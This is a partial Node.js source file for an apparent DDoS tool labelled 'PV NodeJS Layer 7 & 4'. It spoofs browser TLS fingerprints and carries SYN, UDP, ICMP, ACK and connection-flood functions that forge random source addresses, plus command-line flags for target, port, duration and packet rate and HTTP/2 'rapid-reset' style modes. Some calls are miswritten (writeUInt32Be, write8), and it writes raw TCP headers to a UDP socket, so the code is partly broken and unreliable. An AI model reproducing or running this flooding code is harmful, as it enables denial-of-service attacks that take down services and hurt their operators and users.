...
const TLS_PROFILES = [
    ...
    { // Firefox 117 on macOS
        ...
        sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pss_rsae_sha512',
...
// ##################################################################
// #                       LAYER 4 ATTACK CONFIGURATION              #
// ##################################################################

const LAYER4_ATTACKS = {
    'syn-flood': {
        name: 'SYN Flood',
        description: 'TCP SYN Flood attack',
        defaultPort: 80,
        defaultDuration: 60, // seconds
        defaultPps: 1000 // packets per second
    },
    'udp-flood': {
        name: 'UDP Flood',
    ...
    'icmp-flood': {
        ...
        defaultPort: 0, // ICMP doesn't use ports
        defaultDuration: 60,
        defaultPps: 1000
    },
    'ack-flood': {
    ...
    'connection-flood': {
        ...
        description: 'TCP Connection Flood attack',
        defaultPort: 80,
        defaultDuration: 60,
...
// SYN Flood Attack
function synFloodAttack(target, port, duration, pps, callback) {
    const socket = dgram.createSocket('udp4');
    const packet = Buffer.alloc(40);
    
    // IP Header (20 bytes)
    packet.writeUInt8(0x45, 0); // Version (4) and IHL (5)
    packet.writeUInt8(0x00, 1); // Type of Service
    packet.writeUInt16BE(packet.length, 2); // Total Length
    packet.writeUInt16BE(0x1234, 4); // Identification
    packet.writeUInt16BE(0x0000, 6); // Flags and Fragment Offset
    packet.writeUInt8(64, 8); // TTL
    packet.writeUInt8(6, 9); // Protocol (TCP)
    packet.writeUInt16BE(0x0000, 10); // Header Checksum (will be filled later)
    
    // Source IP (random)
    for (let i = 12; i < 16; i++) {
        packet.writeUInt8(Math.floor(Math.random() * 256), i);
    }
    
    // Destination IP
    const targetIp = target.replace(/^\//, '').split(':')[0];
    const ipParts = targetIp.split('.').map(part => parseInt(part, 10));
    for (let i = 0; i < 4; i++) {
        packet.writeUInt8(ipParts[i], 16 + i);
    }
    
    // TCP Header (20 bytes)
    packet.writeUInt16BE(Math.floor(Math.random() * 65535), 20); // Source Port
    packet.writeUInt16BE(port, 22); // Destination Port
    packet.writeUInt32BE(0x00000000, 24); // Sequence Number
    packet.writeUInt32Be(0x00000000, 28); // Acknowledgment Number
    packet.writeUInt8(0x50, 32); // Data Offset (5) and Reserved (0)
    packet.writeUInt8(0x02, 33); // Flags (SYN)
    packet.writeUInt16BE(65535, 34); // Window Size
    packet.writeUInt16BE(0x0000, 36); // Checksum (will be filled later)
    ...
    const interval = setInterval(() => {
        if (Date.now() - startTime > duration * 1000) {
            ...
            socket.close();
            callback(packetsSent);
            return;
        }
        
        // Randomize source port and sequence number
        packet.writeUInt16BE(Math.floor(Math.random() * 65535), 20);
        packet.writeUInt32BE(Math.floor(Math.random() * 4294967295), 24);
...
// UDP Flood Attack
function udpFloodAttack(target, port, duration, pps, callback) {
    const socket = dgram.createSocket('udp4');
    ...
    const interval = setInterval(() => {
        if (Date.now() - startTime > duration * 1000) {
            clearInterval(interval);
            socket.close();
            callback(packetsSent, bytesSent);
            return;
        }
...
// ICMP Flood Attack
function icmpFloodAttack(target, duration, pps, callback) {
    ...
    packet.writeUInt16BE(0x1234, 4); // Identification
    packet.writeUInt16BE(0x0000, 6); // Flags and Fragment Offset
    packet.write8(64, 8); // TTL
    packet.writeUInt8(1, 9); // Protocol (ICMP)
    packet.writeUInt16BE(0x0000, 10); // Header Checksum (will be filled later)
    ...
    // ICMP Header (8 bytes)
    packet.writeUInt8(8, 20); // Type (Echo Request)
    packet.writeUInt8(0, 21); // Code
    packet.writeUInt16BE(0x0000, 22); // Checksum (will be filled later)
    packet.writeUInt16BE(0x1234, 24); // Identifier
    packet.writeUInt16BE(0x5678, 26); // Sequence Number
    ...
    const interval = setInterval(() => {
        ...
        // Randomize identifier and sequence number
        packet.writeUInt16BE(Math.floor(Math.random() * 65535), 24);
        packet.writeUInt16BE(Math.floor(Math.random() * 65535), 26);
        ...
        socket.send(packet, 0, packet.length, targetIp, (err) => {
            if (!err) packetsSent++;
        });
    }, 1000 / pps);
}
...
// ACK Flood Attack
function ackFloodAttack(target, port, duration, pps, callback) {
    const socket = dgram.createSocket('udp4');
    const packet = Buffer.alloc(40);
    ...
    packet.writeUInt32Be(0x00000000, 28); // Acknowledgment Number
    packet.writeUInt8(0x50, 32); // Data Offset (5) and Reserved (0)
    packet.writeUInt8(0x10, 33); // Flags (ACK)
    packet.writeUInt16BE(65535, 34); // Window Size
    packet.writeUInt16BE(0x0000, 36); // Checksum (will be filled later)
    packet.writeUInt16BE(0x0000, 38); // Urgent Pointer
...
function connectionFloodAttack(target, port, duration, connections, callback) {
    const startTime = Date.now();
    ...
    const createConnection = () => {
        if (Date.now() - startTime > duration * 1000 || activeConnections >= connections) {
            if (activeConnections === 0) {
                callback(totalConnections, successfulConnections);
            }
            return;
        }
        ...
        socket.connect(port, target.replace(/^\//, '').split(':')[0], () => {
        ...
        // Don't send any data, just establish the connection
    };
...
const argv = yargs(hideBin(process.argv))
    ...
    .option('attack', {
        alias: 'a',
        describe: 'Specify the attack mode',
        choices: ['none', 'rapid-reset', 'madeyoureset', 'syn-flood', 'udp-flood', 'icmp-flood', 'ack-flood', 'connection-flood'],
        default: 'none'
    })
    .option('protocol', {
        alias: 'p',
    ...
    .option('l4-port', {
        describe: 'Target port for Layer 4 attacks',
        type: 'number',
        default: 80
    })
    .option('l4-duration', {
        describe: 'Duration for Layer 4 attacks in seconds',
        type: 'number',
        default: 60
    })
    .option('l4-pps', {
        describe: 'Packets per second for Layer 4 attacks',
        type: 'number',
        default: 1000
    })
    .option('l4-connections', {
        describe: 'Number of connections for connection flood',
        type: 'number',
        default: 1000
    })
...
const l4Port = argv.l4Port;
const l4Duration = argv.l4Duration;
const l4Pps = argv.l4Pps;
const l4Connections = argv.l4Connections;
...
// --- Layer 4 Attack Worker ---
function startLayer4AttackWorker() {
    if (!isRunning) return;
    
    const targetIp = target.host;
    
    switch (attackMode) {
        case 'syn-flood':
            console.log(chalk.yellow(`Starting SYN Flood attack against ${targetIp}:${l4Port} for ${l4Duration} seconds at ${l4Pps} pps`));
            synFloodAttack(targetIp, l4Port, l4Duration, l4Pps, (packetsSent) => {
                stats.l4PacketsSent += packetsSent;
                console.log(chalk.green(`SYN Flood attack completed. Sent ${packetsSent} packets`));
            });
            break;
            
        case 'udp-flood':
            console.log(chalk.yellow(`Starting UDP Flood attack against ${targetIp}:${l4Port} for ${l4Duration} seconds at ${l4Pps} pps`));
            udpFloodAttack(targetIp, l4Port, l4Duration, l4Pps, (packetsSent, bytesSent) => {
                stats.l4PacketsSent += packetsSent;
                stats.l4BytesSent += bytesSent;
                console.log(chalk.green(`UDP Flood attack completed. Sent ${packetsSent} packets (${formatBytes(bytesSent)})`));
            });
            break;
            
        case 'icmp-flood':
            console.log(chalk.yellow(`Starting ICMP Flood attack against ${targetIp} for ${l4Duration} seconds at ${l4Pps} pps`));
            icmpFloodAttack(targetIp, l4Duration, l4Pps, (packetsSent) => {
                stats.l4PacketsSent += packetsSent;
                console.log(chalk.green(`ICMP Flood attack completed. Sent ${packetsSent} packets`));
            });
            break;
            
        case 'ack-flood':
            console.log(chalk.yellow(`Starting ACK Flood attack against ${targetIp}:${l4Port} for ${l4Duration} seconds at ${l4Pps} pps`));
            ackFloodAttack(targetIp, l4Port, l4Duration, l4Pps, (packetsSent) => {
                stats.l4PacketsSent += packetsSent;
                console.log(chalk.green(`ACK Flood attack completed. Sent ${packetsSent} packets`));
            });
            break;
            
        case 'connection-flood':
            console.log(chalk.yellow(`Starting Connection Flood attack against ${targetIp}:${l4Port} for ${l4Duration} seconds with ${l4Connections} connections`));
            connectionFloodAttack(targetIp, l4Port, l4Duration, l4Connections, (totalConnections, successfulConnections) => {
                stats.l4Connections += totalConnections;
                stats.l4SuccessfulConnections += successfulConnections;
                console.log(chalk.green(`Connection Flood attack completed. ${successfulConnections}/${totalConnections} connections successful`));
            });
            break;
    }
}
...
function updateMonitor() {
    ...
    console.log(chalk.cyan.bold('          ⚡️ PV NodeJS Layer 7 & 4 ⚡️       '));
    console.log(chalk.cyan('--------------------------------------------'));
    ...
    if (attackMode !== 'none') {
        ...
        // Layer 7 attacks
        if (['rapid-reset', 'madeyoureset'].includes(attackMode)) {
        ...
        // Layer 4 attacks
        if (['syn-flood', 'udp-flood', 'icmp-flood', 'ack-flood', 'connection-flood'].includes(attackMode)) {
            const attackConfig = LAYER4_ATTACKS[attackMode];
            console.log(chalk.bgRed.white.bold(` Layer 4 Attack ACTIVE: ${attackConfig.name} `));
            console.log(chalk.white.bold('Target: ') + chalk.green(`${target.host}:${l4Port}`));
            
            if (attackMode === 'connection-flood') {
                console.log(chalk.white.bold('Total Connections: ') + chalk.magenta(stats.l4Connections));
                console.log(chalk.white.bold('Successful Connections: ') + chalk.magenta(stats.l4SuccessfulConnections));
                const successRate = stats.l4Connections > 0 
                    ? ((stats.l4SuccessfulConnections / stats.l4Connections) * 100).toFixed(1)
                    : '0.0';
                console.log(chalk.white.bold('Success Rate: ') + chalk.green(`${successRate}%`));
            } else {
                console.log(chalk.white.bold('Packets Sent: ') + chalk.magenta(stats.l4PacketsSent));
                if (attackMode === 'udp-flood') {
                    console.log(chalk.white.bold('Bytes Sent: ') + chalk.magenta(formatBytes(stats.l4BytesSent)));
                }
                const pps = elapsedSeconds > 0 ? (stats.l4PacketsSent / elapsedSeconds).toFixed(2) : '0.00';
                console.log(chalk.white.bold('Packets/Second: ') + chalk.green(pps));
            }
        }
...
async function main() {
    ...
    if (attackMode !== 'none') {
        if (['rapid-reset', 'madeyoureset'].includes(attackMode)) {
            activeProtocols = ['h2'];
        } else if (['syn-flood', 'udp-flood', 'icmp-flood', 'ack-flood', 'connection-flood'].includes(attackMode)) {
            // Layer 4 attacks don't use HTTP protocols
            activeProtocols = [];
        }
    ...
    } else if (['rapid-reset', 'madeyoureset'].includes(attackMode)) {
    ...
    // Start Layer 4 attack if specified
    if (['syn-flood', 'udp-flood', 'icmp-flood', 'ack-flood', 'connection-flood'].includes(attackMode)) {
        startLayer4AttackWorker();
    }
